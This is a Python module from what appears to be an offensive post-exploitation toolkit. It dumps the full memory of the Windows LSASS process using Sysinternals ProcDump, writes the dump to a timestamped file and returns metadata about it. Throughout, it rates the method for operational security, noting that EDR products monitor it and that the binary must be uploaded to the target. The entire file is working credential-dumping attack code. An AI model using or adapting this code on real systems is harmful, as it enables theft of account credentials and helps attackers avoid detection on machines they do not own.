#!/usr/bin/env python3
"""
LSASS dumping via Sysinternals ProcDump
Requires external tool but signed by Microsoft
"""

import os
import subprocess
from pathlib import Path
from datetime import datetime
from typing import Optional, Dict

from ..utils import get_lsass_pid


class ProcdumpDumper:
    """
    Dump LSASS using Sysinternals ProcDump
    
    OPSEC Level: MEDIUM
    - Signed by Microsoft (legitimate)
    - But monitored by many EDR solutions
    - Requires uploading procdump64.exe
    """
    
    METHOD_NAME = "procdump"
    OPSEC_RATING = "Medium"
    
    def __init__(self, output_dir: Path, procdump_path: Optional[str] = None):
        self.output_dir = Path(output_dir)
        
        # Check common locations for procdump
        if procdump_path:
            self.procdump_path = procdump_path
        else:
            # Try common locations
            possible_paths = [
                r"C:\Windows\Temp\procdump64.exe",
                r"C:\Tools\procdump64.exe",
                r".\procdump64.exe",
                "procdump64.exe"  # In PATH
            ]
            
            self.procdump_path = None
            for path in possible_paths:
                if os.path.exists(path):
                    self.procdump_path = path
                    break
    
    def dump(self) -> Optional[Dict]:
        """
        Execute LSASS dump via ProcDump
        
        Returns:
            Dict with dump metadata or None on failure
        """
        print(f"\n[*] Method: Sysinternals ProcDump")
        print(f"[*] OPSEC: {self.OPSEC_RATING} - Signed Microsoft tool but monitored")
        
        # Check if procdump exists
        if not self.procdump_path or not os.path.exists(self.procdump_path):
            print(f"[-] ProcDump not found")
            print(f"[!] Searched: C:\\Windows\\Temp\\procdump64.exe, C:\\Tools\\procdump64.exe")
            print(f"[!] Download from: https://docs.microsoft.com/en-us/sysinternals/downloads/procdump")
            return None
        
        print(f"[+] ProcDump found: {self.procdump_path}")
        
        # Get LSASS PID
        pid = get_lsass_pid()
        if not pid:
            return None
        
        # Create output file
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        dump_file = self.output_dir / f"lsass_procdump_{timestamp}.dmp"
        
        # Build command
        # -accepteula: Accept EULA automatically
        # -ma: Full memory dump
        cmd = f'"{self.procdump_path}" -accepteula -ma {pid} "{dump_file}"'
        
        print(f"[*] Dumping LSASS with ProcDump...")
        print(f"[*] PID: {pid}")
        
        try:
            # Execute dump
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            # Verify dump was created
            if dump_file.exists():
                size = dump_file.stat().st_size
                
                print(f"[+] LSASS dumped successfully!")
                print(f"[+] Dump file: {dump_file}")
                print(f"[+] Size: {size / 1024 / 1024:.2f} MB")
                
                return {
                    'method': self.METHOD_NAME,
                    'file': str(dump_file),
                    'size': size,
                    'timestamp': timestamp,
                    'opsec_rating': self.OPSEC_RATING
                }
            else:
                print(f"[-] Dump file not created")
                
                if result.stdout:
                    print(f"[*] Output: {result.stdout}")
                if result.stderr:
                    print(f"[-] Error: {result.stderr}")
                
                return None
        
        except subprocess.TimeoutExpired:
            print(f"[-] Dump operation timed out")
            return None
        
        except Exception as e:
            print(f"[-] Dump failed: {e}")
            return None
    
    def is_available(self) -> bool:
        """Check if this method is available"""
        return self.procdump_path is not None and os.path.exists(self.procdump_path)
    
    @staticmethod
    def get_info() -> Dict:
        """Get information about this dump method"""
        return {
            'name': 'procdump',
            'description': 'Sysinternals ProcDump for process dumping',
            'opsec_rating': 'Medium',
            'requirements': [
                'Administrative privileges',
                'procdump64.exe (external tool)'
            ],
            'advantages': [
                'Signed by Microsoft',
                'Legitimate debugging tool',
                'Reliable and stable',
                'Full memory dumps'
            ],
            'disadvantages': [
                'Requires uploading binary',
                'Monitored by many EDRs',
                'Process creation event',
                'Known tool signature'
            ]
        }
